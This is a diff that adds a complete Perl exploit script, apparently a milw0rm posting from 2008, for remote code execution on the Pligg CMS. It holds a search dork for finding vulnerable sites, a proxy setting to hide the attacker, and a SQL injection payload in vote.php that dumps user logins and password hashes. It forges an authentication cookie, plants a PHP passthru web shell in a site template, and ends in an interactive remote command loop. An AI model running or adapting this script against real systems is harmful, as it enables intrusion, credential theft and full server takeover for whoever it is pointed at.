@@ -1,0 +1,204 @@
+#!/usr/bin/perl -w
+use LWP::UserAgent;
+use MIME::Base64;
+use Digest::MD5 qw(md5_hex);
+use Getopt::Std; getopts('h:', \%args);
+
+print "#############################################\n";
+print "# Pligg <= 9.9 Remote Code Execution Exploit \n";
+print "#############################################\n";
+#dork = "Powered By Pligg" + "Legal: License and Source"
+
+# Proxy address
+$ENV{http_proxy} = 'http://127.0.0.1:8118/';
+
+my $http = LWP::UserAgent->new;
+   $http->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1');
+   #$http->env_proxy(); # <-- uncomment for proxy
+   $http->cookie_jar({});
+
+my $host = $args{'h'} || usage(); # Host flag. Specify the Pligg root directory
+my $user = undef;
+my $pass = undef;
+my $file = undef;
+my $data = undef;
+my @auth = undef;
+
+# Details for the php code that is injected in to the template
+my $ereg = '<cmdout>(.*?)<\/cmdout>';
+my $cvar = 'cmd';
+my $cval = 'pwd;id';
+my $code = '<cmdout><?php if ( !empty($_REQUEST["' . $cvar . '"]) ) passthru($_REQUEST["' . $cvar . '"]); ?></cmdout>';
+
+print "[*] Checking if a shell already exists ...\n";
+
+$data = $http->post(
+$host . '/index.php',
+[
+   $cvar  => $cval
+]); 
+
+if ( $data->content =~ /$ereg/si ) 
+{
+	print "[*] Found existing shell ...\n";
+}
+else
+{
+	print "[!] No existing shell found ...\n";
+
+	#############################################
+	# Gather user info via vote.php SQL Injection
+	#############################################
+
+	$data = $http->post(
+	$host . '/vote.php',
+	[
+	   'id'  => '-99 UNION SELECT 1,2,3,null,5,6,concat(user_login,char(58),user_pass),8,9 FROM pligg_users -- /*',
+	   'md5' => 'd41d8cd98f00b204e9800998ecf8427e' # <-- If you aren't logged in this always works
+	]); 
+
+	print "[*] Gathering user information ...\n";
+		
+	if ( $data->content =~ /(.*?):([a-f0-9]{1,64})/i )
+	{
+		$user = $1;
+		$pass = $2;
+
+		# Sets up the cookie to authenticate us
+		@auth = ('Cookie' => 'mnm_user=' . $user . '; mnm_key=' . encode_base64($user . ':' . crypt($user, 22) . ':' . md5_hex($pass)) . ';');
+
+		print "[+] Got user '$user' ...\n";
+
+	}
+	else
+	{
+		print "[!] Unable to get user info. Dumping output ...\n";
+		open(ELOG, '>pligg_debug.html');print ELOG $data->content;close(ELOG);
+		exit;
+	}
+
+	#############################################
+	# Get the template path
+	#############################################
+
+	print "[*] Gathering template information ...\n";
+
+	$data = $http->get($host . '/admin_editor.php',@auth); 
+
+	if ( $data->content =~ />(.*?)<\/option>/i ) 
+	{
+		$file = $1;
+		# Quick and dirty fix
+		$file =~ s/admin_templates\/admin_access_denied.tpl/footer.tpl/;
+		print "[+] Got template file [$file]...\n";
+	}
+
+	#############################################
+	# Read the template contents
+	#############################################
+
+	$data = $http->post(
+	$host . '/admin_editor.php',
+	[
+	   'the_file'  => $file,
+	   'open' => 'Open'
+	]
+	,@auth); 
+
+	print "[*] Reading template data ...\n";
+
+	# Grab the template contents	
+	if ( $data->content =~ /<textarea(.*)>(.*)<\/textarea>/is )
+	{
+		$temp = $2;
+		$temp =~ s/&gt;/>/ig;
+		$temp =~ s/&lt;/</ig;
+		$temp =~ s/&quot;/"/ig;
+		$temp =~ s/&amp;/&/ig;
+
+		print "[+] Got template data ...\n";
+	}
+	else
+	{
+		print "[!] Unable to get template data. Dumping output ...\n";
+		open(ELOG, '>pligg_debug.html');print ELOG $data->content;close(ELOG);
+		exit;
+	}
+
+	#############################################
+	# Update the Template Contents
+	#############################################
+
+
+	$data = $http->post(
+	$host . '/admin_editor.php',
+	[
+	   'the_file2'   => $file,
+	   'updatedfile' => $temp . $code,
+	   'save'        => 'Save+Changes'
+	]
+	,@auth); 
+
+	print "[*] Updating template data ...\n";
+
+	if ( $data->content =~ /File Saved/is )
+	{
+		print "[+] File saved!\n";
+	}
+	else
+	{
+		print "[!] Unable to update template data. Dumping output ...\n";
+		open(ELOG, '>pligg_debug.html');print ELOG $data->content;close(ELOG);
+		exit;
+	}
+}
+
+#############################################
+# Setting up the php shell
+#############################################
+
+print "[*] Setting up shell ...\n";
+
+$data = $http->post(
+$host . '/index.php',
+[
+   $cvar  => $cval
+]); 
+
+if ( $data->content =~ /<cmdout>(.*?)<\/cmdout>/si ) 
+{
+	while ( 1 )
+	{
+		print "pligg:~#";
+		$exec = <STDIN>;
+
+		$data = $http->post(
+		$host . '/index.php',
+		[
+		   $cvar  => $exec
+		]); 
+
+		if ( $data->content =~ /$ereg/si ) 
+		{
+			print $1 . "\n";
+		}
+		else
+		{
+			print "Unexpected Response!\n";
+		}
+	}
+}
+else
+{
+	print "[!] Unable to set up shell ...\n";
+	open(ELOG, '>pligg_debug.html');print ELOG $data->content;close(ELOG);
+	exit;
+}
+
+sub usage
+{
+	print "pligg_exploit.pl -h http://path/to/pligg     \n";
+	exit;
+}
+
+# milw0rm.com [2008-07-30]
